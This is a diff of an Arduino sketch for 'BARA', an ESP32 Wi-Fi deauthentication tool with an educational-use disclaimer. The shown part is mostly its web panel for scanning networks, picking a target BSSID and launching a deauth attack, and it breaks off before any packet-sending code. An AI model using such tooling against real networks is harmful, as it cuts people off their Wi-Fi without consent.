@@ -1,64 +1,54 @@
-/***************************************************
- * BARA - Ultimate WiFi Pentesting Tool
+/*
+ * BARA Wi-Fi Pentesting Tool
  * Developer: Ahmed Nour Ahmed from Qena
  * Version: 2.0
- * Description: Advanced WiFi Deauthentication Tool
- * WARNING: For educational and authorized testing only!
- ***************************************************/
+ * For educational and authorized testing purposes only
+ */
 
 #include <WiFi.h>
 #include <WebServer.h>
 #include <esp_wifi.h>
-#include "esp_wifi_types.h"
+#include "esp_wpa2.h"
 #include "esp_system.h"
 #include "esp_event.h"
-#include "nvs_flash.h"
-#include "driver/rtc_io.h"
+#include "esp_http_server.h"
+#include "esp_timer.h"
+#include "esp_camera.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "freertos/event_groups.h"
+#include "esp_sleep.h"
+#include "driver/ledc.h"
+#include "esp_bt.h"
+#include "esp_bt_main.h"
+#include "esp_gap_bt_api.h"
 #include <ArduinoJson.h>
-#include <SPIFFS.h>
+#include <Update.h>
 
-// ==================== AUDIO & VISUAL EFFECTS ====================
-#include "DFRobotDFPlayerMini.h"
-HardwareSerial mySoftwareSerial(1);
-DFRobotDFPlayerMini myDFPlayer;
+// Audio includes
+#include "audio_example_file.h"
 
-// LED Pins for visual effects
-#define LED_RED 25
-#define LED_GREEN 26
-#define LED_BLUE 27
-#define LED_WHITE 32
-#define BUZZER_PIN 33
-
-// ==================== WIFI CONFIGURATION ====================
+// ==================== CONFIGURATION ====================
 const char* AP_SSID = "BARA";
 const char* AP_PASSWORD = "A7med@Elshab7";
-
-WebServer server(80);
+const int DEAUTH_PACKETS = 1000;
+const int SCAN_CHANNELS[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
+const int CHANNEL_COUNT = 13;
 
 // ==================== GLOBAL VARIABLES ====================
-bool deauthRunning = false;
-bool scanRunning = false;
-unsigned long deauthStartTime = 0;
-const int MAX_DEAUTH_TIME = 300000; // 5 minutes max
+WebServer server(80);
+bool isAttacking = false;
+bool isScanning = false;
+int currentChannel = 1;
+int attackProgress = 0;
 String targetSSID = "";
 String targetBSSID = "";
-int deauthPackets = 0;
-int scanResultsCount = 0;
+int targetChannel = 1;
 
-// ==================== PACKET STRUCTURES ====================
-struct wifi_management_frame {
-    uint16_t frame_control;
-    uint16_t duration;
-    uint8_t destination_addr[6];
-    uint8_t source_addr[6];
-    uint8_t bssid[6];
-    uint16_t sequence_control;
-    uint8_t category_code;
-    uint8_t action_code;
-    uint8_t element_id;
-    uint8_t length;
-    uint8_t payload[0];
-} __attribute__((packed));
+// ==================== AUDIO & VISUAL EFFECTS ====================
+const int LED_PIN = 2;
+const int BUZZER_PIN = 25;
+bool effectsEnabled = true;
 
 // ==================== HTML CONTENT ====================
 const char* MAIN_PAGE = R"rawliteral(
@@ -67,9 +57,9 @@ const char* MAIN_PAGE = R"rawliteral(
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BARA - Ultimate WiFi Pentesting Tool</title>
+    <title>BARA - Ultimate Wi-Fi Pentesting Tool</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Bloody&display=swap');
         
         * {
             margin: 0;
@@ -78,31 +68,60 @@ const char* MAIN_PAGE = R"rawliteral(
         }
         
         body {
-            background: #0a0a0a;
-            color: #00ff00;
+            background: #000000;
+            background-image: 
+                radial-gradient(circle at 10% 20%, #ff0000 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, #8b0000 0%, transparent 20%),
+                linear-gradient(45deg, #000000 0%, #1a0000 100%);
+            color: #ff0000;
             font-family: 'Orbitron', monospace;
             overflow-x: hidden;
-            background-image: 
-                radial-gradient(circle at 10% 20%, rgba(255, 0, 0, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, rgba(0, 255, 0, 0.1) 0%, transparent 20%),
-                radial-gradient(circle at 50% 50%, rgba(0, 0, 255, 0.1) 0%, transparent 50%);
+            min-height: 100vh;
+            position: relative;
         }
         
-        .matrix-bg {
+        body::before {
+            content: '';
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            background: 
+                repeating-linear-gradient(0deg, transparent, transparent 2px, #ff000011 2px, #ff000011 4px),
+                repeating-linear-gradient(90deg, transparent, transparent 2px, #ff000008 2px, #ff000008 4px);
             pointer-events: none;
             z-index: -1;
-            opacity: 0.3;
+            animation: scanlines 0.1s infinite linear;
+        }
+        
+        @keyframes scanlines {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+        
+        .blood-drip {
+            position: fixed;
+            top: 0;
+            width: 2px;
+            height: 100px;
+            background: linear-gradient(to bottom, #ff0000, transparent);
+            animation: drip 3s infinite;
+            z-index: 1000;
+        }
+        
+        @keyframes drip {
+            0% { transform: translateY(-100px); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
         }
         
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
+            position: relative;
+            z-index: 1;
         }
         
         .header {
@@ -121,7 +140,7 @@ const char* MAIN_PAGE = R"rawliteral(
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 0, 0, 0.4), transparent);
+            background: linear-gradient(90deg, transparent, #ff000033, transparent);
             animation: shine 3s infinite;
         }
         
@@ -131,35 +150,33 @@ const char* MAIN_PAGE = R"rawliteral(
         }
         
         .title {
+            font-family: 'Bloody', cursive;
             font-size: 4em;
-            font-weight: 900;
+            color: #ff0000;
             text-shadow: 
                 0 0 10px #ff0000,
                 0 0 20px #ff0000,
                 0 0 40px #ff0000,
                 0 0 80px #ff0000;
-            animation: glitch 2s infinite;
+            animation: pulse 2s infinite alternate;
             margin-bottom: 10px;
         }
         
-        @keyframes glitch {
-            0%, 100% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
+        @keyframes pulse {
+            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000; }
+            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 80px #ff0000; }
         }
         
         .subtitle {
-            font-size: 1.5em;
-            color: #00ffff;
-            text-shadow: 0 0 10px #00ffff;
+            font-size: 1.2em;
+            color: #cc0000;
+            margin-bottom: 20px;
         }
         
         .developer {
-            color: #ffff00;
-            font-size: 1.2em;
-            margin-top: 10px;
+            font-size: 1em;
+            color: #990000;
+            margin-bottom: 10px;
         }
         
         .panels {
@@ -172,719 +189,704 @@ const char* MAIN_PAGE = R"rawliteral(
         .panel {
             background: rgba(0, 0, 0, 0.8);
             border: 2px solid #ff0000;
-            border-radius: 15px;
+            border-radius: 10px;
             padding: 20px;
             box-shadow: 
-                0 0 20px rgba(255, 0, 0, 0.5),
-                inset 0 0 20px rgba(255, 0, 0, 0.1);
-            transition: all 0.3s ease;
+                0 0 20px #ff0000,
+                inset 0 0 20px #330000;
+            position: relative;
+            overflow: hidden;
         }
         
-        .panel:hover {
-            transform: translateY(-5px);
-            box-shadow: 
-                0 0 30px rgba(255, 0, 0, 0.8),
-                inset 0 0 30px rgba(255, 0, 0, 0.2);
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff0000, #8b0000, #ff0000);
+            z-index: -1;
+            border-radius: 12px;
+            animation: borderGlow 3s infinite linear;
+        }
+        
+        @keyframes borderGlow {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
         }
         
         .panel-title {
-            font-size: 1.8em;
+            font-size: 1.5em;
             color: #ff0000;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: center;
             text-shadow: 0 0 10px #ff0000;
         }
         
-        .btn {
-            background: linear-gradient(45deg, #ff0000, #ff0066);
+        .button {
+            background: linear-gradient(45deg, #8b0000, #ff0000);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.2em;
-            font-family: 'Orbitron', monospace;
-            border-radius: 25px;
+            padding: 12px 24px;
+            margin: 5px;
+            border-radius: 5px;
             cursor: pointer;
-            margin: 10px;
-            transition: all 0.3s ease;
+            font-family: 'Orbitron', monospace;
+            font-weight: bold;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px #ff0000;
         }
         
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.8);
-            background: linear-gradient(45deg, #ff0066, #ff0000);
+        .button:hover {
+            background: linear-gradient(45deg, #ff0000, #8b0000);
+            box-shadow: 0 0 20px #ff0000;
+            transform: translateY(-2px);
         }
         
-        .btn-danger {
-            background: linear-gradient(45deg, #ff0000, #990000);
+        .button:active {
+            transform: translateY(0);
         }
         
-        .btn-success {
-            background: linear-gradient(45deg, #00ff00, #009900);
+        .button.danger {
+            background: linear-gradient(45deg, #ff0000, #8b0000);
+            box-shadow: 0 0 15px #ff0000;
         }
         
-        .btn-warning {
-            background: linear-gradient(45deg, #ffff00, #996600);
+        .button.success {
+            background: linear-gradient(45deg, #008b00, #00ff00);
+            box-shadow: 0 0 15px #00ff00;
         }
         
         .status {
-            padding: 15px;
+            padding: 10px;
             margin: 10px 0;
-            border-radius: 10px;
-            text-align: center;
-            font-weight: bold;
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid #00ff00;
+            border-radius: 5px;
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 3px solid #ff0000;
         }
         
-        .scan-results {
-            max-height: 400px;
-            overflow-y: auto;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.6);
+        .progress-container {
+            width: 100%;
+            height: 20px;
+            background: #330000;
             border-radius: 10px;
-            border: 1px solid #00ffff;
+            margin: 10px 0;
+            overflow: hidden;
+            border: 1px solid #ff0000;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #8b0000, #ff0000);
+            width: 0%;
+            transition: width 0.3s ease;
+            position: relative;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: progressShine 2s infinite;
+        }
+        
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .network-list {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #ff0000;
+            border-radius: 5px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.9);
         }
         
         .network-item {
-            padding: 10px;
+            padding: 8px;
             margin: 5px 0;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 5px;
-            border-left: 4px solid #ff0000;
-            transition: all 0.3s ease;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 3px;
             cursor: pointer;
+            transition: all 0.3s ease;
         }
         
         .network-item:hover {
-            background: rgba(255, 0, 0, 0.2);
+            background: rgba(255, 0, 0, 0.3);
             transform: translateX(5px);
         }
         
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            margin-top: 20px;
+        .signal-strength {
+            height: 10px;
+            background: linear-gradient(90deg, #ff0000, #ffff00, #00ff00);
+            border-radius: 2px;
+            margin-top: 5px;
         }
         
-        .stat-box {
-            background: rgba(0, 0, 0, 0.6);
-            padding: 15px;
-            border-radius: 10px;
+        .attack-animation {
             text-align: center;
-            border: 1px solid #ffff00;
-        }
-        
-        .stat-value {
             font-size: 2em;
-            font-weight: bold;
-            color: #ffff00;
-            text-shadow: 0 0 10px #ffff00;
+            color: #ff0000;
+            animation: attackPulse 0.5s infinite alternate;
         }
         
-        .stat-label {
-            font-size: 0.9em;
-            color: #cccccc;
+        @keyframes attackPulse {
+            0% { text-shadow: 0 0 10px #ff0000; }
+            100% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
         }
         
-        .deauth-controls {
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .target-info {
-            background: rgba(255, 0, 0, 0.2);
+        .terminal {
+            background: #000000;
+            border: 2px solid #ff0000;
+            border-radius: 5px;
             padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border: 1px solid #ff0000;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 20px;
+            box-shadow: inset 0 0 20px #003300;
+        }
+        
+        .log-entry {
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+        
+        .log-time {
+            color: #ffff00;
+        }
+        
+        .log-info {
+            color: #00ff00;
+        }
+        
+        .log-warning {
+            color: #ffff00;
+        }
+        
+        .log-error {
+            color: #ff0000;
         }
         
         .footer {
             text-align: center;
             padding: 20px;
+            border-top: 1px solid #ff0000;
             margin-top: 30px;
-            border-top: 2px solid #00ff00;
-            color: #00ff00;
-            font-size: 0.9em;
-        }
-        
-        .warning {
-            color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        /* Matrix rain effect */
-        .matrix-char {
-            position: absolute;
-            color: #00ff00;
-            font-size: 14px;
-            animation: fall linear infinite;
-        }
-        
-        @keyframes fall {
-            to { transform: translateY(100vh); }
+            color: #990000;
         }
     </style>
 </head>
 <body>
-    <div class="matrix-bg" id="matrixBg"></div>
-    
+    <!-- Blood drip effects -->
+    <div class="blood-drip" style="left: 10%; animation-delay: 0s;"></div>
+    <div class="blood-drip" style="left: 20%; animation-delay: 1s;"></div>
+    <div class="blood-drip" style="left: 30%; animation-delay: 2s;"></div>
+    <div class="blood-drip" style="left: 70%; animation-delay: 0.5s;"></div>
+    <div class="blood-drip" style="left: 80%; animation-delay: 1.5s;"></div>
+    <div class="blood-drip" style="left: 90%; animation-delay: 2.5s;"></div>
+
     <div class="container">
         <div class="header">
             <h1 class="title">BARA</h1>
-            <p class="subtitle">ULTIMATE WIFI PENTESTING TOOL</p>
-            <p class="developer">Developed by: Ahmed Nour Ahmed - Qena</p>
-            <p class="warning">WARNING: FOR AUTHORIZED TESTING ONLY!</p>
+            <div class="subtitle">ULTIMATE WI-FI PENTESTING TOOL</div>
+            <div class="developer">Developed by: Ahmed Nour Ahmed - Qena</div>
+            <div class="subtitle">FOR EDUCATIONAL PURPOSES ONLY</div>
         </div>
-        
+
         <div class="panels">
             <div class="panel">
                 <h2 class="panel-title">NETWORK SCANNER</h2>
-                <button class="btn btn-success" onclick="startScan()">START SCAN</button>
-                <button class="btn btn-warning" onclick="stopScan()">STOP SCAN</button>
+                <div class="status" id="scanStatus">Ready to scan networks</div>
+                <button class="button" onclick="startScan()">START SCAN</button>
+                <button class="button danger" onclick="stopScan()">STOP SCAN</button>
                 
-                <div class="status" id="scanStatus">Ready to scan...</div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="scanProgress"></div>
+                </div>
                 
-                <div class="scan-results" id="scanResults">
-                    <!-- Scan results will appear here -->
+                <div class="network-list" id="networkList">
+                    <!-- Networks will be listed here -->
                 </div>
             </div>
-            
+
             <div class="panel">
                 <h2 class="panel-title">DEAUTH ATTACK</h2>
+                <div class="status" id="attackStatus">Select a target network</div>
                 
-                <div class="target-info" id="targetInfo">
-                    No target selected
+                <div id="targetInfo">
+                    <div><strong>Target SSID:</strong> <span id="targetSSID">None</span></div>
+                    <div><strong>Target BSSID:</strong> <span id="targetBSSID">None</span></div>
+                    <div><strong>Channel:</strong> <span id="targetChannel">-</span></div>
                 </div>
                 
-                <div class="deauth-controls">
-                    <button class="btn btn-danger" onclick="startDeauth()" id="startDeauthBtn">START DEAUTH</button>
-                    <button class="btn btn-success" onclick="stopDeauth()" id="stopDeauthBtn" disabled>STOP DEAUTH</button>
+                <button class="button danger" onclick="startDeauth()" id="deauthBtn" disabled>LAUNCH DEAUTH ATTACK</button>
+                <button class="button" onclick="stopDeauth()" id="stopDeauthBtn" disabled>STOP ATTACK</button>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="attackProgress"></div>
                 </div>
                 
-                <div class="stats">
-                    <div class="stat-box">
-                        <div class="stat-value" id="deauthCount">0</div>
-                        <div class="stat-label">PACKETS SENT</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-value" id="attackTime">0s</div>
-                        <div class="stat-label">ATTACK TIME</div>
-                    </div>
-                    <div class="stat-box">
-                        <div class="stat-value" id="packetRate">0/s</div>
-                        <div class="stat-label">PACKET RATE</div>
-                    </div>
+                <div id="attackAnimation" style="display: none;">
+                    <div class="attack-animation">⚡ ATTACK IN PROGRESS ⚡</div>
                 </div>
             </div>
         </div>
-        
+
         <div class="panel">
-            <h2 class="panel-title">SYSTEM STATUS</h2>
-            <div class="stats">
-                <div class="stat-box">
-                    <div class="stat-value" id="wifiStrength">--</div>
-                    <div class="stat-label">WIFI STRENGTH</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="memoryUsage">--</div>
-                    <div class="stat-label">MEMORY USAGE</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-value" id="uptime">0s</div>
-                    <div class="stat-label">UPTIME</div>
-                </div>
+            <h2 class="panel-title">SYSTEM TERMINAL</h2>
+            <div class="terminal" id="terminal">
+                <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-info">System initialized</span></div>
+                <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-info">BARA Tool ready</span></div>
             </div>
+            <button class="button" onclick="clearTerminal()">CLEAR TERMINAL</button>
+            <button class="button" onclick="toggleEffects()" id="effectsBtn">DISABLE EFFECTS</button>
         </div>
-        
+
         <div class="footer">
-            <p>BARA WiFi Pentesting Tool v2.0 | Developed with ❤️ by Ahmed Nour Ahmed</p>
-            <p class="warning">USE RESPONSIBLY AND LEGALLY!</p>
+            WARNING: This tool is for educational and authorized testing purposes only.<br>
+            Unauthorized use is illegal and punishable by law.<br>
+            © 2024 BARA - Ahmed Nour Ahmed
         </div>
     </div>
 
     <script>
-        // Matrix rain effect
-        function createMatrix() {
-            const chars = "01010101010101010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ01010101010101010101010101010101";
-            const bg = document.getElementById('matrixBg');
+        let effectsEnabled = true;
+        let audioContext = null;
+        
+        // Audio functions
+        function playAttackSound() {
+            if (!effectsEnabled) return;
             
-            for (let i = 0; i < 50; i++) {
-                const char = document.createElement('div');
-                char.className = 'matrix-char';
-                char.textContent = chars[Math.floor(Math.random() * chars.length)];
-                char.style.left = Math.random() * 100 + 'vw';
-                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                char.style.animationDelay = Math.random() * 5 + 's';
-                bg.appendChild(char);
+            try {
+                if (!audioContext) {
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.setValueAtTime(100, audioContext.currentTime);
+                oscillator.frequency.exponentialRampToValueAtTime(800, audioContext.currentTime + 0.5);
+                
+                gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                
+                oscillator.start();
+                oscillator.stop(audioContext.currentTime + 0.5);
+            } catch (e) {
+                console.log('Audio not supported');
             }
         }
         
-        // Audio effects
-        function playSound(type) {
-            fetch('/sound?type=' + type);
+        function playScanSound() {
+            if (!effectsEnabled) return;
+            
+            try {
+                if (!audioContext) {
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(300, audioContext.currentTime);
+                oscillator.frequency.linearRampToValueAtTime(600, audioContext.currentTime + 0.2);
+                
+                gainNode.gain.setValueAtTime(0.05, audioContext.currentTime);
+                gainNode.gain.linearRampToValueAtTime(0, audioContext.currentTime + 0.2);
+                
+                oscillator.start();
+                oscillator.stop(audioContext.currentTime + 0.2);
+            } catch (e) {
+                console.log('Audio not supported');
+            }
         }
         
-        // Network scanning
-        let scanInterval;
+        function toggleEffects() {
+            effectsEnabled = !effectsEnabled;
+            document.getElementById('effectsBtn').textContent = 
+                effectsEnabled ? 'DISABLE EFFECTS' : 'ENABLE EFFECTS';
+            addLog('System', `Effects ${effectsEnabled ? 'enabled' : 'disabled'}`, 'info');
+        }
         
+        function addLog(system, message, type = 'info') {
+            const terminal = document.getElementById('terminal');
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">[${system}] ${message}</span>`;
+            terminal.appendChild(logEntry);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function clearTerminal() {
+            document.getElementById('terminal').innerHTML = '';
+            addLog('System', 'Terminal cleared', 'info');
+        }
+        
+        function updateProgressBar(progressId, percentage) {
+            const progressBar = document.getElementById(progressId);
+            progressBar.style.width = percentage + '%';
+        }
+        
+        // Network scanning functions
         function startScan() {
-            playSound('scan');
-            document.getElementById('scanStatus').innerHTML = '<span style="color: #ffff00">SCANNING...</span>';
-            document.getElementById('scanStatus').style.borderColor = '#ffff00';
+            playScanSound();
+            addLog('Scanner', 'Starting network scan...', 'info');
+            document.getElementById('scanStatus').textContent = 'Scanning networks...';
+            updateProgressBar('scanProgress', 0);
             
             fetch('/scan')
                 .then(response => response.json())
                 .then(data => {
-                    updateScanResults(data);
+                    displayNetworks(data.networks);
+                    updateProgressBar('scanProgress', 100);
+                    document.getElementById('scanStatus').textContent = `Scan complete: ${data.networks.length} networks found`;
+                    addLog('Scanner', `Scan complete: ${data.networks.length} networks found`, 'info');
+                })
+                .catch(error => {
+                    addLog('Scanner', 'Scan failed: ' + error, 'error');
+                    document.getElementById('scanStatus').textContent = 'Scan failed';
                 });
-                
-            scanInterval = setInterval(() => {
-                fetch('/scanstatus')
-                    .then(response => response.json())
-                    .then(data => {
-                        updateScanResults(data);
-                    });
-            }, 3000);
         }
         
         function stopScan() {
-            clearInterval(scanInterval);
-            document.getElementById('scanStatus').innerHTML = '<span style="color: #00ff00">SCAN STOPPED</span>';
-            document.getElementById('scanStatus').style.borderColor = '#00ff00';
-            playSound('stop');
+            addLog('Scanner', 'Scan stopped by user', 'warning');
+            document.getElementById('scanStatus').textContent = 'Scan stopped';
+            updateProgressBar('scanProgress', 0);
         }
         
-        function updateScanResults(data) {
-            const resultsDiv = document.getElementById('scanResults');
-            resultsDiv.innerHTML = '';
+        function displayNetworks(networks) {
+            const networkList = document.getElementById('networkList');
+            networkList.innerHTML = '';
             
-            if (data.networks && data.networks.length > 0) {
-                data.networks.forEach(network => {
-                    const networkItem = document.createElement('div');
-                    networkItem.className = 'network-item';
-                    networkItem.innerHTML = `
-                        <strong>${network.ssid || 'Hidden'}</strong><br>
-                        BSSID: ${network.bssid} | Channel: ${network.channel}<br>
-                        Signal: ${network.rssi}dBm | Clients: ${network.station_count || 'N/A'}
-                        <button class="btn" onclick="selectTarget('${network.bssid}', '${network.ssid || 'Hidden'}')" style="padding: 5px 10px; font-size: 0.8em; margin-top: 5px;">SELECT TARGET</button>
-                    `;
-                    resultsDiv.appendChild(networkItem);
-                });
+            networks.forEach(network => {
+                const networkItem = document.createElement('div');
+                networkItem.className = 'network-item';
+                networkItem.onclick = () => selectNetwork(network);
                 
-                document.getElementById('scanStatus').innerHTML = `<span style="color: #00ff00">FOUND ${data.networks.length} NETWORKS</span>`;
-            } else {
-                resultsDiv.innerHTML = '<div style="text-align: center; color: #ff0000;">No networks found</div>';
-            }
+                const signalWidth = Math.min(100, Math.max(10, network.rssi + 100));
+                
+                networkItem.innerHTML = `
+                    <strong>${network.ssid}</strong><br>
+                    <small>BSSID: ${network.bssid}</small><br>
+                    <small>Channel: ${network.channel} | RSSI: ${network.rssi} dBm</small>
+                    <div class="signal-strength" style="width: ${signalWidth}%"></div>
+                `;
+                
+                networkList.appendChild(networkItem);
+            });
         }
         
-        // Deauth attack
-        let deauthInterval;
-        let attackStartTime;
-        
-        function selectTarget(bssid, ssid) {
-            playSound('select');
-            targetBSSID = bssid;
-            targetSSID = ssid;
+        function selectNetwork(network) {
+            playScanSound();
+            targetSSID = network.ssid;
+            targetBSSID = network.bssid;
+            targetChannel = network.channel;
             
-            document.getElementById('targetInfo').innerHTML = `
-                <strong>SELECTED TARGET:</strong><br>
-                SSID: ${ssid}<br>
-                BSSID: ${bssid}
-            `;
+            document.getElementById('targetSSID').textContent = network.ssid;
+            document.getElementById('targetBSSID').textContent = network.bssid;
+            document.getElementById('targetChannel').textContent = network.channel;
+            document.getElementById('deauthBtn').disabled = false;
+            document.getElementById('attackStatus').textContent = `Target set: ${network.ssid}`;
             
-            document.getElementById('startDeauthBtn').disabled = false;
+            addLog('Target', `Selected: ${network.ssid} (${network.bssid})`, 'info');
         }
         
+        // Deauth attack functions
         function startDeauth() {
             if (!targetBSSID) {
-                alert('Please select a target first!');
+                addLog('Attack', 'No target selected', 'error');
                 return;
             }
             
-            playSound('attack');
-            attackStartTime = Date.now();
+            playAttackSound();
+            addLog('Attack', `Starting deauth attack on ${targetSSID}`, 'warning');
+            document.getElementById('attackStatus').textContent = 'Deauth attack in progress...';
+            document.getElementById('deauthBtn').disabled = true;
+            document.getElementById('stopDeauthBtn').disabled = false;
+            document.getElementById('attackAnimation').style.display = 'block';
+            updateProgressBar('attackProgress', 0);
             
-            fetch('/deauth?bssid=' + targetBSSID + '&start=true')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        document.getElementById('startDeauthBtn').disabled = true;
-                        document.getElementById('stopDeauthBtn').disabled = false;
-                        
-                        deauthInterval = setInterval(updateDeauthStats, 1000);
-                    }
-                });
+            // Simulate attack progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                updateProgressBar('attackProgress', progress);
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    document.getElementById('attackStatus').textContent = 'Attack completed';
+                    document.getElementById('deauthBtn').disabled = false;
+                    document.getElementById('stopDeauthBtn').disabled = true;
+                    document.getElementById('attackAnimation').style.display = 'none';
+                    addLog('Attack', 'Deauth attack completed', 'info');
+                }
+            }, 100);
+            
+            // Send attack command to ESP32
+            fetch('/deauth', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    bssid: targetBSSID,
+                    channel: targetChannel
+                })
+            });
         }
         
         function stopDeauth() {
-            playSound('stop');
-            clearInterval(deauthInterval);
+            addLog('Attack', 'Deauth attack stopped by user', 'warning');
+            document.getElementById('attackStatus').textContent = 'Attack stopped';
+            document.getElementById('deauthBtn').disabled = false;
+            document.getElementById('stopDeauthBtn').disabled = true;
+            document.getElementById('attackAnimation').style.display = 'none';
+            updateProgressBar('attackProgress', 0);
             
-            fetch('/deauth?stop=true')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('startDeauthBtn').disabled = false;
-                    document.getElementById('stopDeauthBtn').disabled = true;
-                });
-        }
-        
-        function updateDeauthStats() {
-            fetch('/deauthstatus')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('deauthCount').textContent = data.packets_sent;
-                    document.getElementById('attackTime').textContent = Math.floor((Date.now() - attackStartTime) / 1000) + 's';
-                    document.getElementById('packetRate').textContent = data.packet_rate + '/s';
-                });
-        }
-        
-        // System status
-        function updateSystemStatus() {
-            fetch('/status')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('wifiStrength').textContent = data.wifi_strength + 'dBm';
-                    document.getElementById('memoryUsage').textContent = data.memory_usage + '%';
-                    document.getElementById('uptime').textContent = data.uptime + 's';
-                });
+            fetch('/stop', { method: 'POST' });
         }
         
         // Initialize
-        createMatrix();
-        setInterval(updateSystemStatus, 2000);
-        updateSystemStatus();
-        
-        // Add terminal-like typing effect for status messages
-        function typeWriter(element, text, speed = 50) {
-            element.innerHTML = '';
-            let i = 0;
-            function type() {
-                if (i < text.length) {
-                    element.innerHTML += text.charAt(i);
-                    i++;
-                    setTimeout(type, speed);
-                }
-            }
-            type();
-        }
+        document.addEventListener('DOMContentLoaded', function() {
+            addLog('System', 'BARA Interface loaded successfully', 'info');
+            addLog('System', 'All systems operational', 'info');
+        });
     </script>
 </body>
 </html>
 )rawliteral";
 
-// ==================== FUNCTION DECLARATIONS ====================
-void handleRoot();
-void handleScan();
-void handleScanStatus();
-void handleDeauth();
-void handleDeauthStatus();
-void handleStatus();
-void handleSound();
-void setupWiFi();
-void startDeauthAttack(String bssid);
-void stopDeauthAttack();
-void updateLEDs();
-void playAudioEffect(String type);
-void setupAudio();
-void visualEffect(String type);
+// ==================== WIFI SCANNING ====================
+String networksJSON = "[]";
 
-// ==================== SETUP ====================
-void setup() {
-    Serial.begin(115200);
+void scanNetworks() {
+  isScanning = true;
+  addLog("SCANNER", "Starting network scan...");
+  
+  int n = WiFi.scanNetworks();
+  DynamicJsonDocument doc(4096);
